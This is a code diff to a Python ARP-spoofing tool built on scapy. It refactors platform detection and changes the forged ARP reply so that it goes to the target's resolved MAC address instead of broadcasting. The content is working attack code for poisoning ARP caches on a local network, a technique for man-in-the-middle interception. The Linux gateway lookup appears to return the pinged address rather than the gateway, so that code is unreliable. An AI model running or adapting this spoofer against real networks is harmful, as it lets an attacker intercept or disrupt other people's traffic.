@@ -1,19 +1,19 @@
 import re
 import subprocess
-import platform
 import threading
+from var import system
 from scapy.layers.l2 import ARP, Ether
 from scapy.sendrecv import send, srp
 
 
 def _get_gateway_ip():
-    if platform.system() == 'Linux':
+    if system == 'linux':
         out = subprocess.check_output(['ping', '-c', '1', '8.8.8.8'])
 
         res = out.split(b'\n')[0].split(b' ')[2].decode('UTF-8')
 
         return res
-    elif platform.system() == 'Windows':
+    elif system == 'windows':
         out = subprocess.check_output(['ipconfig']).decode('latin-1')
 
         match = re.search(r'Default Gateway[^:]+: (\d+\.\d+\.\d+\.\d+)', out)
@@ -39,7 +39,8 @@ def _get_mac(ip: str) -> str | None:
 
 
 def _send_pkt(target: str, spoof: str) -> None:
-    packet = ARP(op=2, pdst=target, psrc=spoof, hwdst="ff:ff:ff:ff:ff:ff")
+    mac = _get_mac(target)
+    packet = ARP(op=2, pdst=target, psrc=spoof, hwdst=("ff:ff:ff:ff:ff:ff" if mac is None else mac))
     send(packet, verbose=False)
 
 
